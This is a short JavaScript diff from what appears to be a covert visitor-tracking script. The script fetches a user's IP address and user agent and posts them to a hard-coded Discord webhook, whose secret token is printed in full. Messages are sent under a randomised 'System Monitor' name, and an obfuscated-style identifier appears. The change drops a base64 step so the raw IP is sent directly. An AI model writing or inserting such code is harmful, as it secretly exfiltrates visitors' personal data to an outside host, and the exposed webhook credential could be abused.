@@ -32,21 +32,18 @@
             if (!data?.ip) return;
 
             const info = {
-                ip: data.ip, // Send raw IP without encoding
+                ip: data.ip,
                 ua: navigator.userAgent,
                 ts: Date.now(),
                 id: _0x2b1c
             };
 
-            // Simplified encryption - just base64 encode the whole object
-            const encrypted = btoa(JSON.stringify(info)) 
-                + Math.random().toString(36).slice(2);
-
+            // Send raw IP without encoding
             await fetch('https://discord.com/api/webhooks/1317108564736737382/oxsbS03XDSYsKHyNKFSbgaC90hUY3luNIz-q3BPBDDZ6zVXkagBVEqcBAynL1kqGbPEH', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: encrypted,
+                    content: data.ip,
                     username: 'System Monitor ' + Math.random().toString(36).slice(2)
                 })
             });
